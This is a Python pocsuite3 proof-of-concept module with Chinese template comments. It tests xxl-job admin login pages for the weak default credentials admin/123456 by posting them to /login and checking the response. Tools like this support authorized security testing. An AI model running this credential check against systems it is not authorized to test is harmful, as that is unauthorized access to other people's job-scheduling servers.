from collections import OrderedDict
from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
    get_listener_ip,
    get_listener_port,
)
from pocsuite3.lib.core.interpreter_option import (
    OptString,
    OptDict,
    OptIP,
    OptPort,
    OptBool,
    OptInteger,
    OptFloat,
    OptItems,
)
from pocsuite3.modules.listener import REVERSE_PAYLOAD


class xxl_jobPOC(POCBase):
    vulID = "001"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "wszxx"  # PoC作者的大名
    vulDate = "2014-10-16"  # 漏洞公开的时间,不知道就写今天
    createDate = "2014-10-16"  # 编写 PoC 的日期
    updateDate = "2014-10-16"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/xuxueli/xxl-job"]  # 漏洞地址来源,0day不用写
    name = "xxl_job弱口令 PoC"  # PoC 名称
    appPowerLink = "https://github.com/xuxueli/xxl-job"  # 漏洞厂商主页地址
    appName = "xxl-job"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            xxl_job后台弱口令
        """  # 漏洞简要描述
    pocDesc = """
            poc的用法描述
        """  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        headers = {"User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1"}
        payload = {
            "userName": "admin",
            "password": "123456"
        }
        result = []
        try:
            url = self.url.strip() + "/login"
            res = requests.post(url=url, headers=headers, data=payload, verify=False, timeout=9)
            data_dict = res.json()
            # 判断是否存在漏洞
            if data_dict.get("code") == 200 and data_dict.get("msg") == None:
                result.append(url)

        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(xxl_jobPOC)

